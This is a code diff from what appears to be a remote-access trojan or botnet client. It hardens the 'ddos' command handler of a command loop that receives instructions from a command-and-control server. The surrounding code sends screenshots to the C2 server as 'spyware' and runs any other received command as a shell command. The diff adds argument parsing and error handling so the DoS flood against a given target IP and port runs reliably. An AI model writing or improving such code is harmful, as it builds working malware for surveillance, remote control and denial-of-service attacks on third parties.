@@ -126,8 +126,23 @@ def run_command(cmd, sent_at):
                     send_screenshot_to_c2(file_path,command="spyware",sent_at=sent_at)
                 elif cmd.startswith("ddos"):
                     parts = cmd.split()
-                    _,target_ip, target_port, num_packets, delay, num_threads = parts
-                    output = DoS.DoSSimulator.start_attack(target_ip, target_port, num_packets, delay, num_threads)
+                    if len(parts) ==6:
+                        try:
+                            _, target_ip, target_port, num_packets, delay, num_threads = parts
+
+                            # Convert strings to appropriate types
+                            target_port = int(target_port)
+                            num_packets = int(num_packets)
+                            delay = float(delay)
+                            num_threads = int(num_threads)
+
+                            dos = DoS.DoSSimulator()
+                            dos.start_attack(target_ip=target_ip, target_port=target_port,num_packets=num_packets, delay=delay, num_threads=num_threads)
+                            output = "[✓] DoS attack completed."
+                        except Exception as e:
+                            output = f"[!] DoS command failed: {e}"
+                    else:
+                        output = "[x] Invalid ddos command format. Expected 6 arguments."
                 else:
                     output = subprocess.getoutput(cmd)
             except Exception as e:
